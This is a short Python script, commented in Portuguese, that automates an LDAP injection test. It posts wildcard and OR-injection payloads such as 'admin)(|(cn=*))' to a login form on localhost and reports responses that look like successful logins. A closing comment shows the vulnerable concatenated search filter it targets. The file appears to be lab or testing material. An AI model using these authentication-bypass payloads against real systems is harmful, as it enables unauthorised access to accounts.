import requests

# ===== CONFIGURAÇÃO =====
URL = "http://127.0.0.1:5000/login"
USER_FIELD = "username"
PASS_FIELD = "password"

# ===== PAYLOADS DE TESTE =====
payloads = [
    ("admin", "1234"),        # normal
    ("*", "*"),               # wildcard total
    ("admin", "*"),           # admin + wildcard senha
    ("*", "qualquer"),        # wildcard usuário
    ("admin)(|(cn=*))", "x"), # tentativa OR injection
]

print("\n=== TESTE AUTOMATIZADO LDAP INJECTION ===\n")

for username, password in payloads:
    data = {
        USER_FIELD: username,
        PASS_FIELD: password
    }

    print(f"[+] Testando -> user: {username} | pass: {password}")

    try:
        response = requests.post(URL, data=data)

        if "Incorreto" not in response.text:
            print(">>> POSSÍVEL LOGIN ACEITO <<<")
        else:
            print("Login falhou.")

    except Exception as e:
        print("Erro na requisição:", e)

    print("-" * 50)


#search_filter="(&(cn="+username+")(sn="+password+"))"